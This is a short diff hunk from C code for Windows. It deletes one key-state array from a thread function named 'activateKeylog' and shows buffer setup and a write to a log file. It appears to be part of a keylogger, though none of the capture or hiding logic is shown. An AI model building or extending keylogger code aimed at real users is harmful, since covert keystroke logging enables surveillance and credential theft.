@@ -38,7 +38,6 @@ DWORD WINAPI activateKeylog(LPVOID param)
 	unsigned char count = 1;
 
 	char buffer[5] = {0};
-	bool keyDown[62] = {false};
 
 	fputs("\n", fp); fflush(fp);
 
